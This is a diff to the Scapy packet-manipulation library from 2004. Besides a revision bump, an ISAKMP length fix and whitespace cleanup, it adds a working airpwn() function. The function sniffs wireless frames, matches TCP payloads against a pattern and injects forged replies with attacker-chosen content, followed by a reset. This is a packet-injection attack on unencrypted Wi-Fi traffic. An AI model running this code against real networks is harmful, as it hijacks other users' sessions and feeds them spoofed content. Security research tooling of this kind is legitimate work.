@@ -21,6 +21,9 @@
 
 #
 # $Log: scapy.py,v $
+# Revision 0.9.17.6  2004/08/13 16:49:51  pbi
+# - added first version of airpwn() clone
+#
 # Revision 0.9.17.5  2004/08/11 15:25:08  pbi
 # - added RIP protocol
 #
@@ -427,7 +430,7 @@
 
 from __future__ import generators
 
-RCSID="$Id: scapy.py,v 0.9.17.5 2004/08/11 15:25:08 pbi Exp $"
+RCSID="$Id: scapy.py,v 0.9.17.6 2004/08/13 16:49:51 pbi Exp $"
 
 VERSION = RCSID.split()[2]+"beta"
 
@@ -578,7 +581,7 @@ if __name__ == "__main__":
 ##################
 
 import socket, sys, getopt, string, struct, time, random, os, traceback
-import cPickle, types, gzip
+import cPickle, types, gzip, re
 from select import select
 from fcntl import ioctl
 
@@ -3206,9 +3209,9 @@ class ISAKMP_payload(Packet):
         ]
     def post_build(self, p):
         if self.length is None:
-            p = p[:2]+struct.pack("!I",len(self.load))+p[4:]
+            p = p[:2]+struct.pack("!H",4+len(self.load))+p[4:]
         if self.next_payload is None:
-            t = getattr(self,"ISAKMP_payload_type",0)
+            t = getattr(getattr(self.payload,"load", NoPayload), "ISAKMP_payload_type",0)
             if t:
                 p = chr(t)+p[1:]
         return p
@@ -4002,44 +4005,44 @@ def rdpcap(filename):
     return PacketList(res,filename)
 
 
-class ScapyPcapWriter:                                                          
-        """A pcap writer with more control than wrpcap()                        
-                                                                                
-        This routine is based entirely on scapy.wrpcap(), but adds capability   
-        of writing one packet at a time in a streaming manner.                  
-        """                                                                     
-        def __init__(self, filename):                                           
-                self.f = open(filename,"w")                                     
-                self.f.write(struct.pack("IHHIIII",                             
-                                                0xa1b2c3d4L,                    
-                                                2, 4,                           
-                                                0,                              
-                                                0,                              
-                                                scapy.MTU,                      
-                                                1)) # XXX Find the link type    
-                                                                                
-        def write(self, packets):                                               
-                """accepts a either a single packet or a list of packets        
-                to be written to the dumpfile                                   
-                """                                                             
-                if type(packets) == type(list):                                 
-                        for p in packets:                                       
-                                self.write_packet(p)                            
-                else:                                                           
-                        self.write_packet(packets)                              
-                                                                                
-        def write_packet(self, packet):                                         
-                """writes a single packet to the pcap file                      
-                """                                                             
-                s = str(packet)                                                 
-                l = len(s)                                                      
-                sec = int(packet.time)                                          
-                usec = int((packet.time-sec)*1000000)                           
-                self.f.write(struct.pack("IIII", sec, usec, l, l))              
-                self.f.write(s)                                                 
-                                                                                
-        def __del__(self):                                                      
-                self.f.close()                                                  
+class ScapyPcapWriter:
+        """A pcap writer with more control than wrpcap()
+
+        This routine is based entirely on scapy.wrpcap(), but adds capability
+        of writing one packet at a time in a streaming manner.
+        """
+        def __init__(self, filename):
+                self.f = open(filename,"w")
+                self.f.write(struct.pack("IHHIIII",
+                                                0xa1b2c3d4L,
+                                                2, 4,
+                                                0,
+                                                0,
+                                                scapy.MTU,
+                                                1)) # XXX Find the link type
+
+        def write(self, packets):
+                """accepts a either a single packet or a list of packets
+                to be written to the dumpfile
+                """
+                if type(packets) == type(list):
+                        for p in packets:
+                                self.write_packet(p)
+                else:
+                        self.write_packet(packets)
+
+        def write_packet(self, packet):
+                """writes a single packet to the pcap file
+                """
+                s = str(packet)
+                l = len(s)
+                sec = int(packet.time)
+                usec = int((packet.time-sec)*1000000)
+                self.f.write(struct.pack("IIII", sec, usec, l, l))
+                self.f.write(s)
+
+        def __del__(self):
+                self.f.close()
 
 
 
@@ -4942,8 +4945,73 @@ def bootpd(ipset=Net("192.168.1.128/25"),gw="192.168.1.1",filter="udp and port 6
             sendp(rep,iface=iface)
     except KeyboardInterrupt:
         pass
+
+plst=[]
+def get_toDS():
+    global plst
+    while 1:
+        p,=sniff(iface="eth1",count=1)
+        if not isinstance(p,Dot11):
+            continue
+        if p.FCfield & 1:
+            plst.append(p)
+            print "."
+
+
+def airpwn(iffrom, ifto, replace, pattern="", ignorepattern=""):
+#    if not ifto.endswith("ap"):
+#        print "iwpriv %s hostapd 1" % ifto
+#        os.system("iwpriv %s hostapd 1" % ifto)
+#        ifto += "ap"
+#        
+#    os.system("iwconfig %s mode monitor" % iffrom)
+#    
+    ptrn = re.compile(pattern)
+    iptrn = re.compile(ignorepattern)
+
+    while 1:
+        p, = sniff(iface=iffrom,count=1)
+
+        if not isinstance(p,Dot11):
+            continue
+        if not p.FCfield & 1:
+            continue
+
+        
+        if not p.haslayer(TCP):
+            continue
+        ip = p.getlayer(IP)
+        tcp = p.getlayer(TCP)
+        pay = str(tcp.payload)
+        print "got tcp"
+        if not ptrn.match(pay):
+            continue
+        print "match 1"
+        if iptrn.match(pay):
+            continue
+        print "match 2"
+        del(p.payload.payload.payload)
+        p.FCfield="from-DS"
+        p.addr1,p.addr2 = p.addr2,p.addr1
+        q = p.copy()
+        p /= IP(src=ip.dst,dst=ip.src)
+        p /= TCP(sport=tcp.dport, dport=tcp.sport,
+                 seq=tcp.ack, ack=tcp.seq+len(pay),
+                 flags="PA")
+        q = p.copy()
+        p /= replace
+        q.ID += 1
+        q.getlayer(TCP).flags="RA"
+        q.getlayer(TCP).seq+=len(replace)
+        
+        print "send",repr(p)
+        print "send",repr(q)
+        sendp([p,q], iface=ifto)
+#        sendp(q, iface=ifto)
+        
             
         
+    
         
 
 
